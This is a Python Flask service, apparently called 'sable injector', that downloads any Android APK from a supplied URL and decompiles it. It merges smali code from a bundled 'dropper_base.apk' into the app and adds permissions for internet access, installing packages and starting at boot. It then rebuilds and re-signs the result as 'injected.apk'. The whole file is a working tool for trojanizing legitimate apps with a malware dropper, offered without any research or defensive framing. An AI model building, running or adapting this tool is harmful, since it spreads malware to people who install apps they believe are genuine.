import os
import subprocess
import shutil
import tempfile
import requests
import zipfile
from flask import Flask, request, send_file, jsonify

app = Flask(__name__)
WORK = tempfile.mkdtemp()
KEYSTORE = "keystore.jks"
DROPPER = "dropper_base.apk"

@app.route("/")
def home():
    return "sable injector alive"

@app.route("/inject", methods=["POST"])
def inject():
    try:
        data = request.json or {}
        file_url = data.get("apk_url")
        if not file_url:
            return jsonify({"error": "apk_url required"}), 400

        target = os.path.join(WORK, "target.apk")
        
        # 1. Download APK
        response = requests.get(file_url, stream=True, timeout=60)
        if response.status_code != 200:
            return jsonify({"error": f"Download failed: HTTP {response.status_code}"}), 400
        
        with open(target, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        if not zipfile.is_zipfile(target):
            return jsonify({"error": "Downloaded file is not a valid APK"}), 400

        # 2. Target APK decompile (-r flag use kiya hai taaki resource crash na ho)
        target_dir = os.path.join(WORK, "target_dir")
        shutil.rmtree(target_dir, ignore_errors=True)
        res = subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool target fail: {res.stderr[:150]}"}), 500

        # 3. Dropper APK decompile
        dropper_dir = os.path.join(WORK, "dropper_dir")
        shutil.rmtree(dropper_dir, ignore_errors=True)
        res = subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool dropper fail: {res.stderr[:150]}"}), 500

        # 4. Smali copy
        src = os.path.join(dropper_dir, "smali")
        dst = os.path.join(target_dir, "smali")
        if os.path.exists(src):
            shutil.copytree(src, dst, dirs_exist_ok=True)

        # 5. Manifest merge
        manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
        with open(manifest_path) as f:
            t = f.read()
        perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED","android.permission.WAKE_LOCK"]
        insert = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
        if insert:
            t = t.replace("</application>", insert + "</application>")
        with open(manifest_path, "w") as f:
            f.write(t)

        # 6. Build
        unsigned = os.path.join(WORK, "unsigned.apk")
        res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool build fail: {res.stderr[:150]}"}), 500

        # 7. Sign
        aligned = os.path.join(WORK, "aligned.apk")
        signed = os.path.join(WORK, "signed.apk")
        subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
        
        res = subprocess.run(f"apksigner sign --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Signing failed: {res.stderr[:150]}"}), 500

        return send_file(signed, as_attachment=True, download_name="injected.apk")

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
